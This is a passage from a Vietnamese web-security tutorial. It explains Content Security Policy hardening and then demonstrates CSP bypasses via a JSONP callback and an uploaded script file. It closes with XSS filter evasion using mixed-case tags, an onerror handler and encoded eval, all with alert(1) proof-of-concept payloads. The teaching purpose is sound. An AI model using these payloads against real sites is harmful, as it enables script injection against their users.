- **frame-ancestors 'self'**: Chỉ cho phép cùng một miền nhúng trang vào trong iframe.
- **form-action 'self'**: Chỉ cho phép gửi form đến cùng một miền.

CSP này sẽ ngăn ngừa tất cả các tài nguyên không xác định được tải, chỉ cho phép tải các tài nguyên như hình ảnh, mã JavaScript, và CSS từ chính miền của ứng dụng, cũng như ngăn ngừa các cuộc tấn công như Clickjacking, XSS, và CSRF.

**Loại bỏ Inline JavaScript**

CSP có thể gây lỗi nếu ứng dụng web sử dụng mã JavaScript inline. Để tránh điều này, bạn cần chuyển mã JavaScript từ inline vào trong các tệp script bên ngoài và tải chúng một cách an toàn. Ví dụ, thay vì sử dụng JavaScript inline như sau:

```html
<script>
 var poc = "test";
 function submitForm(){
   console.log(poc);
 }
</script>
<button id="submit" onclick="submitForm()">Submit</button>
```

Hãy chuyển mã vào một tệp JavaScript bên ngoài như `test.js` và tải tệp này:

```javascript
// test.js
var poc = "test";
function submitForm(){
  console.log(poc);
}
document.getElementById("submit").addEventListener('click', submitForm);
```

Và sau đó sử dụng thẻ `<script>` để tải tệp `test.js`:

```html
<script src="/test.js"></script>
```

Điều này giúp loại bỏ mã JavaScript inline, từ đó giúp ứng dụng tuân thủ CSP một cách dễ dàng.

**Công cụ Kiểm tra CSP**

Để kiểm tra và đánh giá CSP của bạn, có thể sử dụng các công cụ trực tuyến như **CSP Evaluator** do Google cung cấp. Công cụ này giúp bạn kiểm tra mức độ an toàn của CSP và đưa ra các khuyến nghị về cách cải thiện nó.

Ngoài ra, bạn cũng có thể tham khảo **CSP Cheat Sheet** để tìm hiểu thêm về cách viết một CSP an toàn và các chỉ thị, giá trị có sẵn.

---
# Bypass CSP

#### CSP và Lỗ Hổng XSS

Content Security Policy (CSP) có thể được sử dụng như một biện pháp bảo vệ để ngăn chặn các lỗ hổng Cross-Site Scripting (XSS). Tuy nhiên, chỉ vì một ứng dụng web triển khai CSP không có nghĩa là nó tự động được bảo vệ khỏi tất cả các cuộc tấn công XSS. Nếu CSP yếu, có thể sẽ có cách để bỏ qua chính sách này. Do đó, việc phân tích CSP của một ứng dụng web để tìm ra các điểm yếu là rất quan trọng.

#### Ví Dụ về CSP Yếu

Hãy xem xét CSP dưới đây:

```
Content-Security-Policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';
```

Trong CSP này, chỉ có thể tải hình ảnh từ chính nguồn (`self`), và mã CSS có thể tải từ bất kỳ đâu (`*`). Các mã JavaScript chỉ được phép tải từ chính nguồn (`self`). Tuy nhiên, chính sách này lại gặp vấn đề với việc cho phép các nguồn bên ngoài có thể thực hiện những cuộc tấn công XSS thông qua các phương thức như JSONP.

Giả sử chúng ta thử tiêm một pop-up `alert()` như một bằng chứng khái niệm (PoC). Do CSP, pop-up sẽ không xuất hiện, thay vào đó, lỗi sau sẽ xuất hiện trong console của trình duyệt:

```
Blocked a frame with origin "http://example.com" from accessing a cross-origin frame.
```

Mặc dù kỹ thuật phòng thủ này có vẻ an toàn ban đầu, nhưng nó vẫn có thể bị bỏ qua thông qua việc lợi dụng JSONP, cho phép lấy dữ liệu từ các API mà không vi phạm chính sách CORS.

##### Ví Dụ về JSONP

Giả sử một API hỗ trợ JSONP và cho phép gọi một hàm JavaScript (chẳng hạn `processData`) từ các nguồn bên ngoài. Bằng cách gọi endpoint như sau:

```
http://someapi.htb/stats?callback=processData
```

API sẽ trả về phản hồi:

```
processData({'clicks': 1337})
```

Bằng cách này, hàm `processData` sẽ được gọi và dữ liệu có thể được sử dụng mà không vi phạm chính sách Same-Origin. Nếu API hỗ trợ JSONP, có thể tiêm mã JavaScript vào trang web mà không bị CSP ngăn chặn. Ví dụ:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
```

Khi script này được tải, pop-up `alert(1)` sẽ được kích hoạt, qua mặt được CSP.

#### Giới Hạn 'self' trong CSP

Một điểm yếu phổ biến khác là giả định rằng giá trị `'self'` luôn an toàn. Chẳng hạn, CSP dưới đây có vẻ an toàn vì chỉ cho phép tải script từ chính nguồn:

```
Content-Security-Policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';
```

Tuy nhiên, nếu ứng dụng web cho phép người dùng tải lên các tệp, và không có kiểm soát về loại tệp tải lên, thì một kẻ tấn công có thể tải lên tệp `.js`. Sau đó, kẻ tấn công có thể tạo một lỗ hổng XSS thông qua việc tải script này từ chính nguồn của ứng dụng:

```html
<script src="/uploads/avatag.jpg.js"></script>
```

#### Đánh Giá CSP Trong Bối Cảnh Thực Tế

Việc đánh giá một CSP phụ thuộc vào chính sách cụ thể và chức năng của ứng dụng web. Ví dụ, việc sử dụng `'self'` trong chỉ thị `script-src` có thể không an toàn nếu ứng dụng cho phép tải lên tệp. Vì vậy, việc đánh giá CSP phải được thực hiện trong bối cảnh chức năng thực tế của ứng dụng web.

# Bypass Bộ Lọc XSS

#### Ba Phương Pháp Để Thực Thi JavaScript

Trước khi bàn về cách bỏ qua bộ lọc XSS, hãy xem ba phương pháp chính để thực thi mã JavaScript:

1. **Script Tag**: Cách phổ biến nhất để thực thi mã JavaScript là thông qua thẻ `<script>`.
2. **Inline JavaScript**: Mã JavaScript có thể được tiêm trực tiếp vào các thẻ HTML thông qua thuộc tính `on*` như `onload`, `onclick`, v.v.
3. **Event Handlers**: Việc sử dụng các bộ xử lý sự kiện trong HTML có thể dẫn đến việc thực thi mã JavaScript.

#### Bỏ Qua Các Danh Sách Đen Cơ Bản

Giả sử ứng dụng web áp dụng một danh sách đen đơn giản để ngăn chặn các từ khóa dẫn đến việc thực thi mã JavaScript, chẳng hạn như các thẻ `<script>`, các giao thức giả như `javascript` và `data`, cũng như các sự kiện như `onerror`, `onload`. Trong trường hợp này, một số cách có thể bỏ qua danh sách đen này là:

- **Dùng chữ hoa và chữ thường**: Vì HTML không phân biệt chữ hoa và chữ thường, có thể thay đổi dạng chữ để bỏ qua danh sách đen:
  ```html
  <ScRiPt>alert(1);</ScRiPt>
  ```
- **Sử dụng sự kiện đặc biệt**: Các sự kiện như `onerror` có thể bị lọc, nhưng bằng cách sử dụng kết hợp các thuộc tính không bị lọc, có thể thực thi mã:
  ```html
  <img src="x" onerror="alert(1)">
  ```

#### Các Bypass Nâng Cao

Nếu bộ lọc XSS cho phép thực thi mã JavaScript từ một thẻ HTML, chúng ta có thể cần vượt qua các bộ lọc bổ sung hạn chế những hàm JavaScript mà chúng ta có thể gọi hoặc dữ liệu nào có thể được truy cập trong ngữ cảnh JavaScript.

Các kỹ thuật mã hóa chuỗi và truyền các chuỗi này tới các điểm thực thi có thể giúp bỏ qua bộ lọc. Ví dụ, ta có thể mã hóa chuỗi `alert(1)` dưới dạng mã hóa ASCII hoặc base64:

```javascript
eval("\141\154\145\162\164\50\61\51");
```

#### Tài Nguyên

- Để tham khảo các phương pháp bỏ qua bộ lọc XSS, hãy tham khảo [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
- Ngoài ra, có các bộ sưu tập payloads cho các bộ lọc khác nhau, ví dụ nếu không thể sử dụng dấu ngoặc đơn, ta có thể tham khảo [XSS without Parentheses Payloads](https://github.com/xxczaki/xss-payloads).

